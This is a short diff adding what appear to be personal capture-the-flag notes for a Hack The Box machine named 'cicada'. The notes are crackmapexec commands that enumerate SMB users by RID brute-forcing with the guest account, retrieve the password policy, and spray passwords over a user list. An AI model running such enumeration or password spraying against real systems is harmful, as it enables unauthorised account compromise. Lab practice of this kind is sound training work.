@@ -1,0 +1,20 @@
+crackmapexec smb --pass-pol 10.10.10.35
+
+Bruteforce
+crackmapexec smb 10.10.11.35 -u "guest" -p '' --rid-brute | grep SidTypeUser
+
+#Working
+crackmapexec smb 10.10.11.35 -u "guest" -p '' --rid-brute | grep "SidTypeUser"
+crackmapexec smb cicada.htb -u "guest" -p '' --rid-brute | grep "SidTypeUser"
+
+
+crackmapexec smb 10.10.11.35 -u /path/to/userlist.txt -p '' -d cicada.htb
+
+
+crackmapexec smb 10.10.11.35 --pass-pol
+
+
+crackmapexec smb 10.10.11.35 -u user -p passwd --continue-on-success
+
+
+
